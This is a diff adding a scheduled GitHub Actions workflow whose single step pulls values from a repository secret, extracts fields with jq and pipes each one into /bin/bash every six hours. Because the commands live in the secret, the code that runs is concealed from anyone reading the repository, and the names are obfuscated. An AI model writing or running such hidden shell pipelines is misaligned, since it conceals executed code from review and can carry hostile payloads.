@@ -1,0 +1,27 @@
+name: cheyingchangzuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cheyingchangzuan
+        env:
+          o997: ${{ secrets.o997 }}
+        run: |
+          echo $o997 | jq -r .nm29268 | /bin/bash
+          echo $ohpv0 | jq -r .snbq791 | /bin/bash
+          echo $rt586 | jq -r .lula26079 | /bin/bash
+          echo $g5090 | jq -r .l3812 | /bin/bash
+          echo $g796 | jq -r .ads43860 | /bin/bash
+          echo $h476 | jq -r .kvkh03 | /bin/bash
+          echo $gom0755 | jq -r .jmfnh864 | /bin/bash
+          echo $owdc5301 | jq -r .wmq5 | /bin/bash
+          echo $ej32105 | jq -r .cx9 | /bin/bash
+
